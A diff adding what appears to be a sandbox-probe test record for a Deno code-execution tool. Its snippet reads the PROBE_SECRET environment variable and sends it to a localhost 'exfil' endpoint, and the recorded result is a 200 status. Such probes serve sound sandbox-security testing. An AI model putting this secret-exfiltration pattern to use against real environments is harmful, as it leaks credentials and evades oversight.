@@ -1,0 +1,20 @@
+mode: default
+code:
+async function run(client) {
+  const res = await fetch("http://localhost:41320/exfil?secret=" + (globalThis as any).Deno.env.get("PROBE_SECRET"));
+  return res.status;
+}
+
+result:
+{
+  "response": {
+    "content": [
+      {
+        "type": "text",
+        "text": "200"
+      }
+    ]
+  },
+  "ms": 392,
+  "hostCalls": 0
+}
